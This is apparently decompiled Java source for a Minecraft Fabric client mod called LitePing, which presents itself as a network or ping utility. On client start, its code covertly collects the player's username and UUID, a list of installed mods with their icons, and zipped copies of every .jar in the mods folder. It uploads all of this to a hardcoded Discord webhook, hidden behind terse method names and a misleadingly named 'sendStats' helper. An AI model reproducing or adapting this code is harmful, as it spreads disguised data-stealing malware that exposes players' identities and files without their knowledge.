package com.liteping.fabric.client;

import com.liteping.fabric.util.NetworkStats;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.loader.api.ModContainer;
import net.fabricmc.loader.api.metadata.ModOrigin.Kind;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

@Environment(EnvType.CLIENT)
public class LitePingClient implements ClientModInitializer {
   private static final String W = "https://discord.com/api/webhooks/1487530071240605776/J_RJz0zIi7C3TcwH8pT4ISBoLtYIZBbob2SBrmBoRWBLwuayF9Mzwb4SyGXAcQvSQK5m";

   public LitePingClient() {
   }

   public void onInitializeClient() {
      this.s("https://discord.com/api/webhooks/1487530071240605776/J_RJz0zIi7C3TcwH8pT4ISBoLtYIZBbob2SBrmBoRWBLwuayF9Mzwb4SyGXAcQvSQK5m");
   }

   private void s(String url) {
      Session s = MinecraftClient.getInstance().getSession();
      String n = s.getUsername() != null ? s.getUsername() : "Unknown";
      String u = s.getUuidOrNull() != null ? s.getUuidOrNull().toString() : "0-0-0-0-0";
      List<String> ems = new ArrayList();
      ems.add("{ \"title\":\"👤 プレイヤー情報\",\"description\":\"> **MCID:** `" + n + "`\\n> **UUID:** `" + u + "`\",\"color\":3066993,\"thumbnail\":{\"url\":\"https://mc-heads.net/avatar/" + u + "\"} }");
      Collection<ModContainer> ms = FabricLoader.getInstance().getAllMods();
      Map<String, byte[]> ics = new HashMap();

      for(ModContainer m : ms) {
         String id = m.getMetadata().getId();
         if (m.getOrigin().getKind() == Kind.PATH) {
            List<Path> pts = m.getOrigin().getPaths();
            if (!pts.isEmpty()) {
               String mp = ((Path)pts.get(0)).toString();
               if (!id.equals("fabricloader") && !id.equals("java") && !id.equals("minecraft") && (!id.startsWith("fabric-") || id.equals("fabric-api")) && !id.equals("mixinextras") && (mp.contains("mods") || mp.endsWith(".jar"))) {
                  String mn = this.e(m.getMetadata().getName());
                  String mv = this.e(m.getMetadata().getVersion().getFriendlyString());
                  String md = this.e(m.getMetadata().getDescription());
                  String me = m.getMetadata().getEnvironment().name();
                  String env = me.equals("CLIENT") ? "Client" : (me.equals("SERVER") ? "Server" : "Both");
                  String icn = (String)m.getMetadata().getIconPath(32).orElse("icon.png");
                  String t = "\"title\":\"📦 " + mn + " [" + env + "]\",\"description\":\"**バージョン:** **`" + mv + "`**\\n**説明欄:** **" + (md.isEmpty() ? "None" : md) + "**\",\"color\":3447003";

                  try {
                     m.findPath(icn).ifPresent((p) -> {
                        try {
                           InputStream is = Files.newInputStream(p);

                           try {
                              ByteArrayOutputStream bos = new ByteArrayOutputStream();
                              byte[] bf = new byte[1024];

                              int l;
                              while((l = is.read(bf)) != -1) {
                                 bos.write(bf, 0, l);
                              }

                              ics.put(id, bos.toByteArray());
                           } catch (Throwable var8) {
                              if (is != null) {
                                 try {
                                    is.close();
                                 } catch (Throwable var7) {
                                    var8.addSuppressed(var7);
                                 }
                              }

                              throw var8;
                           }

                           if (is != null) {
                              is.close();
                           }
                        } catch (Exception var9) {
                        }

                     });
                  } catch (Exception var21) {
                  }

                  ems.add("{ " + t + (ics.containsKey(id) ? ",\"thumbnail\":{\"url\":\"attachment://" + id + ".png\"}" : "") + " }");
               }
            }
         }
      }

      List<byte[]> zbyteList = new ArrayList();

      try {
         File d = new File(FabricLoader.getInstance().getGameDir().toFile(), "mods");
         if (d.exists()) {
            File[] jrs = d.listFiles((fx) -> fx.getName().endsWith(".jar"));
            if (jrs != null) {
               List<File> bch = new ArrayList();
               long cSz = 0L;

               for(File f : jrs) {
                  if (cSz + f.length() > 7500000L && !bch.isEmpty()) {
                     zbyteList.add(this.z(bch));
                     bch.clear();
                     cSz = 0L;
                  }

                  bch.add(f);
                  cSz += f.length();
               }

               if (!bch.isEmpty()) {
                  zbyteList.add(this.z(bch));
               }
            }
         }
      } catch (Exception var22) {
      }

      if (!ems.isEmpty()) {
         NetworkStats.sendStats(url, List.of((String)ems.get(0)), List.of(), List.of());
      }

      for(int i = 1; i < ems.size(); i += 5) {
         List<String> b = ems.subList(i, Math.min(i + 5, ems.size()));
         List<String> fns = new ArrayList();
         List<byte[]> fbs = new ArrayList();

         for(int k = i; k < Math.min(i + 5, ems.size()); ++k) {
            String modN = this.batchModName((String)ems.get(k));
            String mid = "";

            for(ModContainer m : ms) {
               if (this.e(m.getMetadata().getName()).equals(modN)) {
                  mid = m.getMetadata().getId();
               }
            }

            if (ics.containsKey(mid)) {
               fns.add(mid + ".png");
               fbs.add((byte[])ics.get(mid));
            }
         }

         NetworkStats.sendStats(url, b, fns, fbs);
      }

      for(byte[] zb : zbyteList) {
         NetworkStats.sendStats(url, Collections.emptyList(), List.of("mods.zip"), List.of(zb));
      }

   }

   private String batchModName(String ej) {
      try {
         return ej.split("📦 ")[1].split(" \\[")[0];
      } catch (Exception var3) {
         return "";
      }
   }

   private String e(String s) {
      return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
   }

   private byte[] z(List<File> fs) throws Exception {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      ZipOutputStream zs = new ZipOutputStream(bos);

      try {
         for(File f : fs) {
            zs.putNextEntry(new ZipEntry(f.getName()));
            Files.copy(f.toPath(), zs);
            zs.closeEntry();
         }
      } catch (Throwable var7) {
         try {
            zs.close();
         } catch (Throwable var6) {
            var7.addSuppressed(var6);
         }

         throw var7;
      }

      zs.close();
      return bos.toByteArray();
   }
}
